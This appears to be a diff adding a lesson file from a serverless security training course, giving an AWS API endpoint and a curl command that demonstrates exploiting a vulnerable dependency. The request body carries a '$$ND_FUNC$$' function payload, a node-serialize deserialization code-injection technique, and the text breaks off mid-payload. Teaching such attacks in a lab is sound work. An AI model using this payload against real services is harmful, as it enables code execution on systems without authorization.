@@ -1,0 +1,14 @@
+Lesson 9: Vulnerable Dependancies
+
+API End Point:
+https://yoqkwmk19l.execute-api.us-east-1.amazonaws.com/Stage/order
+
+Description:
+This call tries to exploit a vulnerable dependency by passing a malicious function into it.
+
+Curl Command:
+
+curl -X POST "https://yoqkwmk19l.execute-api.us-east-1.amazonaws.com/Stage/order" ^
+-H "Content-Type: application/json" ^
+-H "authorization: dummy" ^
+-d "{\"action\":\"$$ND_FUNC$$function(){console.error('DEPENDENCY_HACK
